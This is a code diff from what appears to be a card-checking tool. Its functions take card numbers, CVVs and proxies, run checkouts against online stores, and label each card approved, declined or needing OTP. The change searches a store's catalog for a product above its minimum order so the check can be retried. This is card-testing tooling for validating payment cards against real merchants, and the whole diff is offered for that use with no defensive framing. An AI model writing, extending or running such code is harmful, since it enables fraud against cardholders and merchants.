@@ -401,7 +401,8 @@ def sh2_check():
         status = "APPROVED"
     elif "OTP_REQUIRED" in msg_u or "ACTION_REQUIRED" in msg_u:
         status = "REQUIRES_ACTION"
-    elif success is True:
+    elif success is True or "VALIDATION_CUSTOM" in msg_u:
+        # VALIDATION_CUSTOM = the store's own rule (min-order etc.) — the store is alive
         status = "DECLINED"
     else:
         status = "ERROR"
@@ -455,19 +456,20 @@ def _sh2_run(cc, site, proxy, variant):
             idx += 1
             continue
         if "VALIDATION_CUSTOM" in msg:
-            # store rule (e.g. "less than the $12.00 minimum") — pick a variant
-            # priced above the store's minimum
+            # store rule (e.g. "less than the $12.00 minimum") — deep-search the catalog
+            # for a variant priced above the store's minimum, then check that
             _mm = re.search(r"\$([0-9][0-9.,]*)", msg)
             if _mm:
                 try:
                     need = float(_mm.group(1).replace(",", ""))
                 except ValueError:
                     return res
-                nxt = next((c for c in cands if c["id"] not in tried and c["price"] >= need), None)
-                if nxt:
-                    cands.append({"id": nxt["id"], "price": nxt["price"]})
-                    idx = len(cands) - 1
-                    continue
+                try:
+                    info2 = _aio.run(_sfp(site_url, proxy or None, price_floor=need))
+                except Exception:
+                    return res
+                if isinstance(info2, dict) and info2.get("variant_id"):
+                    return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, info2["variant_id"], proxy or None))
             return res
         return res
     return last
